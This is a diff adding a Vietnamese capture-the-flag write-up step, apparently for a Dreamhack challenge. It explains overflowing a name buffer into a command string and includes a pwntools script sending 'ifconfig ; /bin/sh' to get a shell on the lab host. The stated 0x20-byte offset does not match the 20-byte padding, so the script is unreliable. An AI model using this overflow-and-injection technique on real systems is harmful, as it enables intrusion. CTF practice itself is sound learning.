@@ -51,6 +51,24 @@
 * Để chiếm được hệ thống thì ta phải để **shell** thực hiện lệnh `/bin/sh`.
 * Như vậy trong bài này nếu ta overwrite được **cmd_ip** với 8byte đầu `"ifconfig"` và theo sau là lệnh `"/bin/sh"` và ta cần xâu chuỗi 2 lệnh đó, ta dùng `";"`.
 
-*  
+*  <img width="613" height="455" alt="image" src="https://github.com/user-attachments/assets/fb124e18-e540-4a7b-b81c-1b3080a567b8" />
+
+	Ta thấy được từ địa chỉ bắt đầu của **center_name** đến địa chỉ mảng **cmd_ip** đang chữa chuỗi "ifconfig" là **0x20** byte, ta đi exploit
+* ```python
+  #!/usr/bin/python3
+
+  p=remote('host3.dreamhack.games', 23902)
+
+  payload = b'a'*20 + b'ifconfig ; /bin/sh'
+
+  p.sendafter(b'name: ', payload)
+
+  p.interactive()
+  ```
+  
+* <img width="553" height="182" alt="image" src="https://github.com/user-attachments/assets/59f6abef-93e0-4c64-bc48-535806cc018d" />
+
+   
+
 
   
